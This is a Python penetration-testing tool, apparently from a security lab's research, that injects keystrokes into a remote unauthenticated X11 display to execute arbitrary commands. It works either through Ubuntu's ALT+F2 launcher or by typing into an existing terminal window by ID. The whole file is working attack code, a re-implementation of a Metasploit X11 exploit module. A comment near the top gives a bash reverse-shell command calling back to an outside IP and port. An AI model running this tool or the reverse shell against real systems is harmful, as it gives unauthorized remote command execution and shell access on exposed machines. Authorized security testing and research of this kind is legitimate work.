#!/usr/bin/python3

from Xlib import display, ext, protocol, X, XK
import argparse
import string
import time

description = """

            by David E. Baker of K logix Security's Scorpion Labs

pyX11sendcmd is a Python-based tool for sending (nearly) arbitrary keystrokes
to a remote (Open?) X Display System. At heart, it is a re-implementation of
Metasploit's unix/x11/x11_keyboard_exec module with a few added features.
Namely, pyX11sendcmd allows the caller to specify whether commands are to be
sent through the remote system's QuickLaunch menu (as the Metasploit module
does) but also allows the user to specify a window directly by window ID
(presumably ascertained from alternative sources like xwininfo).

In 'root' mode, pyX11sendcmd sends the hotkeys to open up a quicklaunch menu
on Ubuntu (ALT+F2) then sends a command specified on the command-line by -C or
--desktop_command. It then sends a command specified by -c or --window_command
to the window that currently has focus (ideally the one that was just opened by
the desktop command). There are two delays: -D or --desktop_delay is the
amount of time to wait for the remote desktop to react to hotkeys and the
desktop command (that is- opening the quicklaunch menu and launching a
terminal). Then --keyboard_delay or -K is the amount of time to wait between
sending subsequent keystrokes to the active window. This introduces latency
tolerance not seen in the corresponding Metasploit module. Because this mode is
tied to the Ubuntu quicklaunch shortcut it has not been tested outside of
Ubuntu 14, 16, and 18.

Ubuntu 18 will show a desktop popup after the quicklaunch menu is used to
display to the user that the requested application is ready. This can cause
some instability if the application isn't already in use as it will steal the
input focus from the recently-opened window.

In 'window' mode, pyX11sendcmd takes a user command specified on the command
line by -c or --window_command and sends it directly to an already-open X
Window, specified by -w or --window. (The xwininfo command can be used to
identify good targets.) Once specified, pyX11sendcmd changes focus to that
window, delivers the command's keystrokes (separated timewise by the value
specified in the --keyboard_delay or -K parameter) then sends the 'Return' key
and returns window focus to the original. This method requires a terminal to
already be open in the display, but because it doesn't rely on the quicklaunch
shortcuts it can target other Unix-based operating systems in addition to
Ubuntu. (Tested on CentOS 6 and 7. Solaris and FreeBSD coming soon?)

See the following for more information:
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/x11/x11_keyboard_exec.md
https://www.klogixsecurity.com/scorpion-labs-blog/
"""

# -c '/bin/bash -c "bash -i >& /dev/tcp/192.168.115.130/8888 0>&1"'

def buildKeycodeDictionary(remoteDisplay, commandString):

    keysyms = dict()
    for entry in list(set(commandString)):
        # only grab the expected key symbols to minimize lookups
        if entry in '<>{}/|"&();-. ':
            match entry:
                case '<':
                    keysyms[entry] = XK.string_to_keysym("less")
                case '>':
                    keysyms[entry] = XK.string_to_keysym("greater")
                case '{':
                    keysyms[entry] = XK.string_to_keysym("bracketleft")
                case '}':
                    keysyms[entry] = XK.string_to_keysym("bracketright")
                case '/':
                    keysyms[entry] = XK.string_to_keysym("slash")
                case '|':
                    keysyms[entry] = XK.string_to_keysym("bar")
                case '"':
                    keysyms[entry] = XK.string_to_keysym("quotedbl")
                case '&':
                    keysyms[entry] = XK.string_to_keysym("ampersand")
                case '(':
                    keysyms[entry] = XK.string_to_keysym("parenleft")
                case ')':
                    keysyms[entry] = XK.string_to_keysym("parenright")
                case ';':
                    keysyms[entry] = XK.string_to_keysym("semicolon")
                case '-':
                    keysyms[entry] = XK.string_to_keysym("minus")
                case '.':
                    keysyms[entry] = XK.string_to_keysym("period")
                case ' ':
                    keysyms[entry] = XK.string_to_keysym("space")
        elif entry in string.printable[0:62]:
            keysyms[entry] = XK.string_to_keysym(entry)
        else:
            print("[-] Character {} is not presently supported.".format(entry))
            exit(1)

    keycodes = dict()
    for entry in list(keysyms.keys()):
        keycodes[entry] = remoteDisplay.keysym_to_keycode(keysyms[entry])
            
    return keycodes


def sendDesktopCommand(
        target,
        command,
        desktop_command,
        desktop_delay,
        keyboard_delay
    ):
    # open the specified remote display
    remoteDisplay = display.Display(target)

    # set the input focus to the root window
    remoteDisplay.set_input_focus(
        remoteDisplay.screen().root,
        X.RevertToParent,
        X.CurrentTime
    )

    # build the dictionary of unique keycodes used by the remote commands
    keycodes = buildKeycodeDictionary(
        remoteDisplay,
        command + desktop_command
    )

    # and get the keycodes relevant to desktop and window commands
    laltsym = XK.string_to_keysym("Alt_L")
    laltcode = remoteDisplay.keysym_to_keycode(laltsym)
    f2keysym = XK.string_to_keysym("F2")
    f2keycode = remoteDisplay.keysym_to_keycode(f2keysym)
    returnsym = XK.string_to_keysym("Return")
    returncode = remoteDisplay.keysym_to_keycode(returnsym)
    lshiftsym = XK.string_to_keysym("Shift_L")
    lshiftcode = remoteDisplay.keysym_to_keycode(lshiftsym)

    # hold ALT_L
    ext.xtest.fake_input(remoteDisplay, X.KeyPress, laltcode)
    if (desktop_delay):
        remoteDisplay.flush()
        time.sleep(desktop_delay)
    # tap F2
    ext.xtest.fake_input(remoteDisplay, X.KeyPress, f2keycode)
    if (keyboard_delay):
        remoteDisplay.flush()
        time.sleep(keyboard_delay)
    ext.xtest.fake_input(remoteDisplay, X.KeyRelease, f2keycode)
    if (desktop_delay):
        remoteDisplay.flush()
        time.sleep(desktop_delay)
    # release ALT_L
    ext.xtest.fake_input(remoteDisplay, X.KeyRelease, laltcode)
    if (keyboard_delay):
        remoteDisplay.flush()
        time.sleep(keyboard_delay)
    # sync displays to make sure all keystrokes are sent
    remoteDisplay.sync()

    # send the desktop command to the quicklaunch window
    for entry in ' ' + desktop_command:
        ext.xtest.fake_input(remoteDisplay, X.KeyPress, keycodes[entry])
        ext.xtest.fake_input(remoteDisplay, X.KeyRelease, keycodes[entry])
        # including a delay adds some stability
        if keyboard_delay:
            time.sleep(keyboard_delay)
            remoteDisplay.flush()

    if (desktop_delay):
        time.sleep(desktop_delay)
    remoteDisplay.sync()

    # send the 'enter' key code to execute the remote command
    ext.xtest.fake_input(remoteDisplay, X.KeyPress, returncode)
    ext.xtest.fake_input(remoteDisplay, X.KeyRelease, returncode)

    if (desktop_delay):
        time.sleep(desktop_delay)
    remoteDisplay.sync()

    # add the keystrokes to the input queue one-by-one, including shifts
    for entry in ' ' + command:
        if entry in '<>{}|"&()' or entry in string.ascii_uppercase:
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, lshiftcode)
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, lshiftcode)
        else:
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, keycodes[entry])
        # including a delay adds some stability
        if keyboard_delay:
            time.sleep(keyboard_delay)
            remoteDisplay.flush()

    if (desktop_delay):
        time.sleep(desktop_delay)
    remoteDisplay.sync()

    # add the 'Return' keystroke to execute the command in a terminal
    ext.xtest.fake_input(remoteDisplay, X.KeyPress, returncode)
    ext.xtest.fake_input(remoteDisplay, X.KeyRelease, returncode)

    # send the events to synchronize the "displays" and run the command
    return remoteDisplay.sync()

def sendWindowCommand(
        target,
        window,
        command,
        keyboard_delay
    ):
    # open the specified remote display
    remoteDisplay = display.Display(target)

    # store the initial desktop focus to restore it later
    initialFocus = remoteDisplay.get_input_focus()

    # set the input focus to the targeted window
    remoteDisplay.set_input_focus(
        int(window, 16),
        X.RevertToParent,
        X.CurrentTime
    )

    # build the dictionary of unique keycodes used by the remote keyboard
    keycodes = buildKeycodeDictionary(
        remoteDisplay,
        command
    )

    # and get the codes for special characters and the 'Return' key
    lshiftsym = XK.string_to_keysym("Shift_L")
    lshiftcode = remoteDisplay.keysym_to_keycode(lshiftsym)
    returnsym = XK.string_to_keysym("Return")
    returncode = remoteDisplay.keysym_to_keycode(returnsym)

    # synchronize before actually sending keystrokes
    remoteDisplay.sync()

    # add the keystrokes to the input queue one-by-one, including shifts
    for entry in ' ' + command:
        if entry in '<>{}|"&()' or entry in string.ascii_uppercase:
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, lshiftcode)
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, lshiftcode)
        else:
            ext.xtest.fake_input(remoteDisplay, X.KeyPress, keycodes[entry])
            ext.xtest.fake_input(remoteDisplay, X.KeyRelease, keycodes[entry])
        # including a delay seems to add some stability
        if keyboard_delay:
            time.sleep(keyboard_delay)
            remoteDisplay.flush()

    remoteDisplay.sync()

    # add the 'Return' keystroke to execute the command in a terminal
    ext.xtest.fake_input(remoteDisplay, X.KeyPress, returncode)
    ext.xtest.fake_input(remoteDisplay, X.KeyRelease, returncode)

    # finally, restore the initial input display focus
    remoteDisplay.set_input_focus(
        initialFocus.focus,
        X.RevertToParent,
        X.CurrentTime
    )

    # send the events to synchronize the "displays" and run the command
    return remoteDisplay.sync()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        default = "localhost",
        help = "target URL or IP address to throw against"
    )
    parser.add_argument(
        "-d",
        "--display",
        default = "0",
        help = "display number to target (default = 0)"
    )
    parser.add_argument(
        "-c",
        "--window_command",
        default = "sleep 10",
        help = "command to send to the remote window (default = sleep 10)"
    )
    parser.add_argument(
        "-C",
        "--desktop_command",
        default = "xterm",
        help = "command to send to the desktop launch option (default = xterm)"
    )
    parser.add_argument(
        "-w",
        "--window",
        help = "window ID to target (cannot be used with --root)"
    )
    parser.add_argument(
        "-R",
        "--root",
        action = "store_true",
        default = False,
        help = "target the root display (cannot be used with --window)"
    )
    parser.add_argument(
        "-K",
        "--keyboard_delay",
        default = 0.1,
        type = float,
        help = "time (seconds; supports decimals) between simulated keystrokes"
    )
    parser.add_argument(
        "-D",
        "--desktop_delay",
        default = 1.0,
        type = float,
        help = "time (seconds; supports decimals) between desktop input events"
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action = "store_true",
        default = False,
        help = "increase output verbosity (not currently implemented)"
    )
    args = parser.parse_args()

    if args.window and args.root:
        print("[-] The 'window' and 'root' options cannot be used together.")
    elif args.window:
        sendWindowCommand(
            args.target + ":" + args.display,
            args.window,
            args.window_command,
            args.keyboard_delay
        )
    elif args.root:
        sendDesktopCommand(
            args.target + ":" + args.display,
            args.window_command,
            args.desktop_command,
            args.desktop_delay,
            args.keyboard_delay,
        )
    else:
        print("[-] Either the 'window' or 'root' option must be specified.")

    return 0

if __name__ == "__main__":
    main()
